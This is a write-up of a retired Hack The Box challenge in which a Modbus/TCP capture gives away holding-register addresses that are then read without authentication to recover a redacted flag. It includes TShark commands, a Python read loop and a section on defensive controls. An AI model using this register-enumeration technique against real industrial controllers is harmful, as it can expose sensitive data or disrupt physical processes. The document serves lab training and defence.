---
title: "Hack The Box Challenge — Intrusion"
summary: "Modbus/TCP write acknowledgements expose a sparse register map, enabling an unauthenticated client to recover sensitive data with targeted reads."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Hardware"
difficulty: "Easy"
solvedAt: 2026-09-22
publishedAt: 2026-09-22
tags:
  - ics-security
  - ot-security
  - modbus-tcp
  - packet-analysis
  - register-enumeration
  - information-disclosure
  - python
tools:
  - TShark
  - Python
  - uModbus
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Intrusion"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Intrusion. At solve time on 22 September 2026, the challenge page displayed both “Writeup Available” and an “Official Writeup” control; Hack The Box's challenge documentation identifies the absence of available public write-ups as a characteristic of active Challenges. The flag, ephemeral target address, personal paths and unrelated sensitive information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Intrusion provides a one-way Modbus/TCP packet capture and a deliberately incomplete Python client. The capture does not contain the register values themselves: it contains only traffic from TCP port `502` toward the client, including server acknowledgements for earlier write requests. Those acknowledgements still disclose the Modbus Unit ID, the starting address of each write and the number of registers affected.

Filtering for Function Code `0x10` (Write Multiple Registers) recovered 42 single-register addresses in chronological order. The live challenge service allowed unauthenticated Function Code `0x03` reads of those same holding registers. Reading one value from each address and interpreting the low byte as ASCII reconstructed a bounded `HTB{...}` token.

The core issue is the combination of exposed register metadata and unauthenticated access to sensitive holding registers. The packet capture provides the map; the live Modbus service provides the values.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Intrusion` |
| Platform | Hack The Box |
| Portfolio category | Hardware |
| Difficulty | Easy |
| Status | Retired, confirmed 22 September 2026 |
| Protocol | Modbus/TCP |
| Core weakness | Unauthenticated reads from sensitive holding registers |
| Evidence source | One-way server-to-client packet capture |

## Provided material and evidence boundaries

The local challenge directory contained:

```text
Intrusion/
├── client.py
├── Intrusion.zip
├── Intrusion.zip:Zone.Identifier
└── network_logs.pcapng
```

The archive, packet capture and Windows zone metadata remain outside this public repository. Only the sanitized solver created during the solve is published.

The supplied `client.py` was a skeleton built around `uModbus`:

```python
from umodbus import conf
from umodbus.client import tcp

conf.SIGNED_VALUES = True

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 502))

# write your umodbus command here
# command =

tcp.send_message(command, sock)
```

It established the expected library and transport but left the target and Modbus command incomplete. The PCAP therefore had to supply the Unit ID, function choice and register addresses.

## Initial analysis

### Correcting the Python dependency

The first execution failed before reaching the network:

```bash
python3 client.py -h
```

```text
ModuleNotFoundError: No module named 'umodbus'
```

Installing `pymodbus` did not help because it is a different package and does not provide the `umodbus` import used by the supplied code. The correct dependency was:

```bash
python3 -m venv venv
source venv/bin/activate
pip install uModbus
```

`client.py` also had no argument parser, so `-h` was never expected to produce help; once its imports succeeded, it would immediately try the hard-coded socket connection.

### Discovering the traffic direction

An initial field extraction looked only for Function Codes `3` and `4`:

```bash
tshark -r network_logs.pcapng \
  -Y "modbus.func_code == 3 || modbus.func_code == 4" \
  -T fields \
  -e frame.number \
  -e mbtcp.trans_id \
  -e modbus.func_code \
  -e modbus.reference_num
```

It returned only the header row. That did not mean the file lacked Modbus; it meant the capture did not contain the anticipated read operations.

The TCP conversation summary revealed a single stream and, importantly, a single captured direction:

```bash
tshark -r network_logs.pcapng -q -z conv,tcp
```

```text
192.168.1.252:502 <-> 192.168.1.11:56186
                     0 frames 0 bytes <- 168 frames 13 kB
```

All 168 frames travelled from the system using Modbus port `502` toward the high client port. The corresponding client requests were absent.

Inspecting raw TCP payloads showed recognizable MBAP headers:

```bash
tshark -r network_logs.pcapng \
  -Y "tcp.len > 0" \
  -T fields \
  -e frame.number \
  -e tcp.payload \
  | head
```

```text
1  bad10000000434010103
2  91ed00000006341000060001
3  b91d00000006340f00100004
4  3d3300000006340f00160004
```

These packets already exposed a repeating four-frame structure. A first forced-decode attempt used port `1502` and returned nothing. The conversation table showed why: the actual captured service port was `502`.

## Identifying the register map

Forcing the correct dissector produced structured Modbus fields:

```bash
tshark -r network_logs.pcapng \
  -d tcp.port==502,mbtcp \
  -Y modbus \
  -T fields \
  -e frame.number \
  -e mbtcp.trans_id \
  -e mbtcp.unit_id \
  -e modbus.func_code \
  -e modbus.reference_num \
  -e modbus.word_cnt \
  -E header=y
```

The first group decoded as:

```text
frame  unit  function  reference  count
1      52    1
2      52    16        6          1
3      52    15        16
4      52    15        22
```

Every packet used Unit ID `52`, encoded as `0x34` in the MBAP header. The function sequence repeated across the entire capture:

| Function | Meaning in this capture | Useful evidence |
| ---: | --- | --- |
| `1` | Read Coils response | Returned coil bits, not the target register data |
| `16` (`0x10`) | Write Multiple Registers response | Echoed starting register and quantity |
| `15` (`0x0f`) | Write Multiple Coils response | Echoed coil address and quantity |

A Modbus Function `0x10` response does not repeat the values that were written. It does, however, echo the starting address and register count. Since each acknowledgement reported a count of one, every response disclosed one candidate holding-register location.

For example, frame 2 contained:

```text
91ed 0000 0006 34 10 0006 0001
```

```text
91ed  transaction ID
0000  protocol ID
0006  length
34    Unit ID 52
10    Write Multiple Registers response
0006  starting address 6
0001  one register
```

Filtering only these acknowledgements recovered the sparse map:

```bash
tshark -r network_logs.pcapng \
  -d tcp.port==502,mbtcp \
  -Y "modbus.func_code == 16" \
  -T fields \
  -e frame.number \
  -e mbtcp.unit_id \
  -e modbus.reference_num \
  -e modbus.word_cnt \
  -E header=y
```

The chronological register list was:

```text
6, 10, 12, 21, 22, 26, 47, 53, 63, 77, 83, 86, 89, 95,
96, 104, 123, 128, 131, 134, 139, 143, 144, 145, 153, 163,
168, 173, 179, 193, 206, 210, 214, 215, 219, 221, 224, 225,
226, 231, 239, 253
```

There were exactly 42 entries. Their order was evidence, so they were not sorted or deduplicated.

The same extraction can be performed from the raw payloads when automatic decoding is unavailable:

```bash
tshark -r network_logs.pcapng \
  -Y "tcp.srcport == 502 && tcp.len > 0" \
  -T fields \
  -e tcp.payload \
| python3 -c 'import sys; print(",".join(str(int(p[16:20],16)) for line in sys.stdin if (p:=line.strip()) and len(p)>=24 and p[14:16]=="10"))'
```

This works because the Modbus function byte begins at hexadecimal-character offset 14 in these complete TCP payloads, followed by the two-byte register address.

## Chronological solution

### 1. Preserve the disclosed order

The Function `0x10` responses were processed in frame order. Sorting the numeric addresses would destroy the intended byte sequence; deduplicating them could remove repeated characters if two positions referenced the same register.

### 2. Read the holding registers

Function `0x10` identifies holding-register writes, so the matching read operation is Function `0x03` (Read Holding Registers). The final client opened one connection to the current retired-challenge instance and issued a one-register read for each recovered address:

```python
for address in REGISTER_ADDRESSES:
    command = tcp.read_holding_registers(
        slave_id=52,
        starting_address=address,
        quantity=1,
    )
    response = tcp.send_message(command, sock)
    values.append(int(response[0]))
```

No broad register scan was required. The PCAP reduced the task to 42 targeted reads.

### 3. Convert the returned words to characters

The returned values were small integers representing one ASCII character per register. The beginning and end of the verified run were:

```text
[01/42] register=  6 value= 72  hex=0x0048 char='H'
[02/42] register= 10 value= 84  hex=0x0054 char='T'
[03/42] register= 12 value= 66  hex=0x0042 char='B'
[04/42] register= 21 value=123  hex=0x007b char='{'
...
[42/42] register=253 value=125  hex=0x007d char='}'
```

The opening `HTB{` and closing `}` established both the correct address order and the one-byte-per-register interpretation. The complete token is intentionally redacted.

## Verified solver

The sanitized solver accepts the current instance host and port as arguments, uses Unit ID `52`, performs only the 42 targeted reads and checks the decoded bytes for an `HTB{...}` boundary.

[Download the sanitized Intrusion solver](/files/writeups/hackthebox/challenges/hardware/intrusion/solve_intrusion.py).

Run it against a fresh retired-challenge instance:

```bash
python3 -m venv venv
source venv/bin/activate
pip install uModbus
python3 solve_intrusion.py <TARGET> <PORT>
```

The verified remote execution returned 42 values and a complete HTB-formatted token:

```text
[*] Connecting to <TARGET>:<PORT> (Unit ID 52)
[*] Reading 42 holding registers
...
[+] one byte per register:
'HTB{<REDACTED_FLAG>}'

[FLAG] HTB{<REDACTED_FLAG>}
```

The downloadable script contains the recovered addresses but no fixed target, flag or personal filesystem information.

## Validation

The solution was validated at several layers:

1. TShark decoded all 168 frames as Modbus/TCP after selecting port `502`.
2. Every relevant Function `0x10` response used Unit ID `52` and acknowledged exactly one register.
3. The extraction produced 42 addresses in frame order.
4. All 42 live Function `0x03` reads returned one value successfully.
5. The first four values decoded to `HTB{` and the final value decoded to `}`.
6. The concatenated result matched a complete HTB flag boundary.

Only the format and boundaries are reported publicly; the actual token is omitted.

## Failed approaches and course corrections

### Installing the wrong Modbus package

`pymodbus` was initially installed, but the supplied script imports `umodbus`. The unchanged `ModuleNotFoundError` made the mismatch clear. Installing `uModbus` resolved the dependency without changing the supplied import style.

### Filtering only for read-register traffic

The initial `modbus.func_code == 3 || modbus.func_code == 4` filter returned nothing. The capture contained only the server side of earlier operations and used Function Codes `1`, `15` and `16`. Inspecting the conversation direction and raw payloads was more reliable than assuming the expected function in advance.

### Decoding port 1502 instead of 502

A forced decode on TCP port `1502` produced no packets. The conversation summary had already identified `502`; applying the dissector to that port exposed the Modbus fields immediately. This was a port-selection error, not malformed traffic.

## Why the technique works

Modbus/TCP's MBAP header and Protocol Data Unit are deterministic and unencrypted. A Write Multiple Registers response necessarily confirms the Unit ID, starting address and quantity so that a client can associate the acknowledgement with its request. Even though the one-way capture omitted the values from the original write requests, it preserved enough metadata to locate the interesting holding registers.

The live service then allowed those registers to be read without an authentication or authorization decision. Modbus traditionally assumes that network placement is the trust boundary; it does not provide native per-request confidentiality or access control. Once the register map was known, ordinary Function `0x03` requests were sufficient to recover the stored text.

The attack path is therefore:

```text
one-way PCAP
    -> Function 0x10 acknowledgements
    -> Unit ID + sparse holding-register addresses
    -> unauthenticated Function 0x03 reads
    -> 16-bit values
    -> one-byte ASCII sequence
```

No memory corruption, brute force or register-wide scan was needed.

## Defensive perspective

| Weakness | Defensive control |
| --- | --- |
| Sensitive text stored directly in PLC registers | Keep credentials and secrets outside ordinary process memory |
| Unauthenticated holding-register reads | Place an authenticated gateway in front of the controller and apply address-level read policy |
| Directly reachable Modbus service | Segment OT networks and allow only approved HMI or engineering hosts |
| Cleartext protocol metadata | Use protected tunnels between trusted endpoints where operationally supported |
| Sparse writes reveal sensitive locations | Alert on writes to unusual register ranges and correlate them with later reads |
| One control plane for process and secret data | Separate safety/process state from authentication and secret-management systems |

In a real OT environment, even reads require care: register polling can affect timing or availability on constrained equipment. Passive capture analysis should precede active interaction, and testing should be coordinated with process owners.

## Key takeaways

- Start with traffic direction and protocol conversations before assuming which Modbus function codes will be present.
- Server acknowledgements can leak useful structure even when request payloads are absent.
- Function `0x10` responses reveal where data was written; Function `0x03` reads it back.
- Preserve packet order when recovered addresses encode an ordered message.
- Distinguish `uModbus` from `pymodbus`; they are separate Python packages with different imports and APIs.
- Prefer targeted register reads derived from evidence over noisy full-range scanning.
- Treat PLC registers as process state, not secure storage for credentials or other sensitive information.

## References

- [Hack The Box — Intrusion](https://app.hackthebox.com/challenges/Intrusion)
- Supplied `network_logs.pcapng` and `client.py` artifacts (not redistributed)
- [Hack The Box — How to Play Challenges](https://help.hackthebox.com/en/articles/5185436-how-to-play-challenges)
- [Hack The Box — Streaming / Writeups / Walkthrough Guidelines](https://help.hackthebox.com/en/articles/5188925-streaming-writeups-walkthrough-guidelines)
